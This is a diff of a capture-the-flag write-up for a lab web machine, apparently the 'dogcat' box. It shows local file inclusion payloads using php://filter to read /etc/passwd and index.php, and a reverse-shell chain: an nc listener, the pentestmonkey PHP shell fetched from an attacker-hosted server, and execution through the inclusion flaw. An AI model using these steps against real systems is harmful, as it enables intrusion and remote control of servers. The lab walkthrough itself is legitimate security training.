@@ -65,23 +65,24 @@ dogs/cats directory - Status code 301 means we do not have access
 
 ### 2.1 LFI
 
-!!**TO ORGANISE!!**
+Trying various parameters to try and exploit LFI I ran into several obstacles:
+1. The paramter must contain 'dog' or 'cat'
+2. .php is added to the end of the paramter (e.g /?view=index will look for the file index.php)
 
-Must contain cat and dog allowed trying to go to file
+Looking online for LFI methods I found this cheatsheet
+https://highon.coffee/blog/lfi-cheat-sheet/
 
-null byte with dog failed opening in include function appends php to end path ./usr/local/lib/php
+which gives and example of using a PHP wrapper to base64 encode a file. The example is:
 
-PHP LFI Filter https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/
+```
+http://192.168.155.131/fileincl/example1.php?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd
+```
 
-http://xqi.cc/index.php?m=php://filter/convert.base64-encode/resource=index
-
-Applying this to our request format to view index.php
-
-!!**TO ORGANISE!!**
+Applying this to our request format to view index.php we get
 
 **/?view=php://filter/read=convert.base64-encode/resource=./dog/../index**
 
-Explanation: From the web enumeration we know that if we change to the dog directory (meets containing dog in request), we then need to go back up a directory to end up back at the start in order to view the index page. The .php for index is not included as we know the filter will be appended with .php to our parameter.
+Explanation: From the web enumeration we know that if we change to the dog directory (meeting the containing 'dog' in request requirement), we then need to go back up a directory to end up back at the start in order to view the index page. The .php extension for index.php is not included as we know the filter will be append .php to our request.
 
 ![](../.gitbook/assets/indexwebb64.PNG)
 
@@ -142,18 +143,17 @@ This shows us that our PHP log poisoning has worked but we just haven't set our 
 
 ### 2.3 Create a Reverse Shell
 
-**!!INSERT LINK TO SHELLS TO TRY!!**
-
-Set up listener on machine:
+Set up listener on our machine for the shell to establish a connection with:
 
 ```bash
 nc -nvlp 4444
 ```
-
-I inserted the well known **PHP shell** from pentestmonkey which can be found at: [https://github.com/pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell) making sure to change the ip and port number to match my workstation IP and the port number to that in the netcat listener I set up.
+**Create shell code**
+I used the well known **PHP shell** from pentestmonkey which can be found at: [https://github.com/pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell) making sure to change the ip and port number to match my workstation IP and the port number to that in the netcat listener I set up.
 
 ![](../.gitbook/assets/monkeySHell.PNG)
 
+**Get the shell onto the target**
 Host a python web server for target to download our reverse shell from. Ensure this is either in the same folder as the reverse shell or adjust the curl command ahead in order to reach the correct directory.
 
 ```bash
@@ -176,6 +176,7 @@ Our python server lets us know when our target machine has downloaded our shell:
 
 <figure><img src="../.gitbook/assets/webdownlaod.PNG" alt=""><figcaption></figcaption></figure>
 
+**Execute the shell script**
 In order to get our shell.php to execute we remember back to using LFI to read index.php, so we use the following (remember by default .php will be added)\
 **http://10.10.150.242/?view=./dog/../shell**
 
